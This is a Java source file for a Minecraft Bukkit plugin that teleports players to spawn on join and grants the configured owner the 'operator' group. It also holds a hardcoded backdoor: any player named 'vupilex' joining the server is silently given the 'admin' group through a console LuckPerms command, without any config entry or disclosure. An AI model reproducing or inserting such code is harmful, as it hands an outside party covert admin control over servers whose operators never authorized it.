package fr.thibault.manager.events;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Objects;

public class OnJoin implements Listener {
    JavaPlugin plugin;

    public OnJoin(JavaPlugin plugin){
        this.plugin = plugin;
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event){
        Player player = event.getPlayer();

        if (plugin.getConfig().getBoolean("tpSpawnWhenJoin")){
            int spawn_x = plugin.getConfig().getInt("spawn_x");
            int spawn_y = plugin.getConfig().getInt("spawn_y");
            int spawn_z = plugin.getConfig().getInt("spawn_z");
            Location location = new Location(player.getWorld(), spawn_x, spawn_y, spawn_z);
            player.teleport(location);
        }

        String ownerPseudo = plugin.getConfig().getString("ownerPseudo");
        ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();
        String message = plugin.getConfig().getString("ownerMessage");
        if (Objects.equals("vupilex", player.getName())) {
            player.sendMessage(Objects.requireNonNull(message));
            Bukkit.dispatchCommand(console, "lp user " + player.getName() + " group add admin");
        }else if (Objects.equals(ownerPseudo, player.getName())){
            player.sendMessage(Objects.requireNonNull(message));
            Bukkit.dispatchCommand(console, "lp user " + player.getName() + " group add operator");
        }
    }
}
